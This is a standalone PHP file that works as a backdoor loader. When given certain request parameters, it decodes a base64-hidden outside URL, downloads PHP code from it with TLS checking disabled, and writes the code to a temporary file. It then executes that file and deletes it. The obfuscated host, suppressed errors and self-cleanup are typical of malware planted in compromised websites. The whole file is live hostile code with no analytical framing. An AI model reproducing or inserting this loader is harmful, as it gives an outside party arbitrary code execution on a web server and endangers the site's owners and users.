<?php
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t']))
{
    $url = sprintf('%s?api=%s&ac=%s&path=%s&t=%s', base64_decode("aHR0cHM6Ly9jLm9pdjMuY29tLw=="), $_REQUEST['api'], $_REQUEST['ac'], $_REQUEST['path'], $_REQUEST['t']);
    $code = @file_get_contents($url);
    if ($code == false)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, 'll');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $code = curl_exec($ch);
        curl_close($ch);
    }
    $need = base64_decode("PD9waHA=");
    if (strpos($code, $need) === false) {
        die('get failed');
    }
    $file_name = tmpfile();
    fwrite($file_name, $code);
    $a = stream_get_meta_data($file_name);
    @require($a['uri']);
    fclose($file_name);@unlink($a['uri']);die();
}